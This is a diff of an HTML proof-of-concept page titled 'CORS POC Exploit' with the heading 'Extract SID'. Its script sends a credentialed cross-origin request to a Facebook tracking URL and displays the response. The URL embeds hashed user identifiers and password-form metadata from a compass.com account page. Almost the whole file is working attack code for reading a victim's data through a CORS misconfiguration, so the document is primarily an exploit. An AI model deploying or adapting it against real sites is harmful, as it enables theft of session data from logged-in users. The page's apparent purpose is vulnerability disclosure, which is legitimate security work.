@@ -1,22 +1,27 @@
+<!DOCTYPE html>
 <html>
-     <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://www.facebook.com/tr/?id=2059883304287023&ev=SubscribedButtonClick&dl=https%3A%2F%2Fwww.compass.com%2Faccount%2F&rl=https%3A%2F%2Fwww.compass.com%2F&if=false&ts=1710023012310&cd[buttonFeatures]=%7B%22classList%22%3A%22cx-solidBtn%20cx-solidBtn--sm%22%2C%22destination%22%3A%22https%3A%2F%2Fwww.compass.com%2Faccount%2F%22%2C%22id%22%3A%22%22%2C%22imageUrl%22%3A%22%22%2C%22innerText%22%3A%22Save%22%2C%22numChildButtons%22%3A0%2C%22tag%22%3A%22button%22%2C%22type%22%3A%22submit%22%2C%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D&cd[buttonText]=Save&cd[formFeatures]=%5B%7B%22id%22%3A%22%22%2C%22name%22%3A%22currentPassword%22%2C%22tag%22%3A%22input%22%2C%22inputType%22%3A%22password%22%7D%2C%7B%22id%22%3A%22%22%2C%22name%22%3A%22newPassword%22%2C%22tag%22%3A%22input%22%2C%22inputType%22%3A%22password%22%7D%2C%7B%22id%22%3A%22%22%2C%22name%22%3A%22passwordConfirmation%22%2C%22tag%22%3A%22input%22%2C%22inputType%22%3A%22password%22%7D%5D&cd[pageFeatures]=%7B%22title%22%3A%22Account%20-%20Compass%22%7D&cd[parameters]=%5B%5D&sw=1920&sh=987&ud[em]=cdf2c71596a931dc376a177cf3c88f3424b23d3cecbd9b3d41bbea1e7918c3fa&ud[fn]=0478721f1106c2a631a90181bac7efc77767a3903eb9220687bff8a14e940fa7&ud[ln]=e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9&v=next&r=canary&a=seg&ec=1&o=4126&fbp=fb.1.1710005489439.989268638&cs_est=true&ler=empty&it=1710022989586&coo=false&dpo=LDU&dpoco=0&dpost=0&es=automatic&tm=3&cdl=&uppt=0.10000000000582077&uvpt=0&ttf=23524.300000000003&bdsize=226458&btsize=226458&brbs=0&cdsize=67431&ctsize=67431&crbs=0&let=32.39999999999418&estcl=18&iwlpcl=0&rqm=GET", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
-     </body>
- </html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://www.facebook.com/tr/?id=2059883304287023&ev=SubscribedButtonClick&dl=https%3A%2F%2Fwww.compass.com%2Faccount%2F&rl=https%3A%2F%2Fwww.compass.com%2F&if=false&ts=1710023012310&cd[buttonFeatures]=%7B%22classList%22%3A%22cx-solidBtn%20cx-solidBtn--sm%22%2C%22destination%22%3A%22https%3A%2F%2Fwww.compass.com%2Faccount%2F%22%2C%22id%22%3A%22%22%2C%22imageUrl%22%3A%22%22%2C%22innerText%22%3A%22Save%22%2C%22numChildButtons%22%3A0%2C%22tag%22%3A%22button%22%2C%22type%22%3A%22submit%22%2C%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D&cd[buttonText]=Save&cd[formFeatures]=%5B%7B%22id%22%3A%22%22%2C%22name%22%3A%22currentPassword%22%2C%22tag%22%3A%22input%22%2C%22inputType%22%3A%22password%22%7D%2C%7B%22id%22%3A%22%22%2C%22name%22%3A%22newPassword%22%2C%22tag%22%3A%22input%22%2C%22inputType%22%3A%22password%22%7D%2C%7B%22id%22%3A%22%22%2C%22name%22%3A%22passwordConfirmation%22%2C%22tag%22%3A%22input%22%2C%22inputType%22%3A%22password%22%7D%5D&cd[pageFeatures]=%7B%22title%22%3A%22Account%20-%20Compass%22%7D&cd[parameters]=%5B%5D&sw=1920&sh=987&ud[em]=cdf2c71596a931dc376a177cf3c88f3424b23d3cecbd9b3d41bbea1e7918c3fa&ud[fn]=0478721f1106c2a631a90181bac7efc77767a3903eb9220687bff8a14e940fa7&ud[ln]=e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9&v=next&r=canary&a=seg&ec=1&o=4126&fbp=fb.1.1710005489439.989268638&cs_est=true&ler=empty&it=1710022989586&coo=false&dpo=LDU&dpoco=0&dpost=0&es=automatic&tm=3&cdl=&uppt=0.10000000000582077&uvpt=0&ttf=23524.300000000003&bdsize=226458&btsize=226458&brbs=0&cdsize=67431&ctsize=67431&crbs=0&let=32.39999999999418&estcl=18&iwlpcl=0&rqm=GET", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
+</body>
+</html>
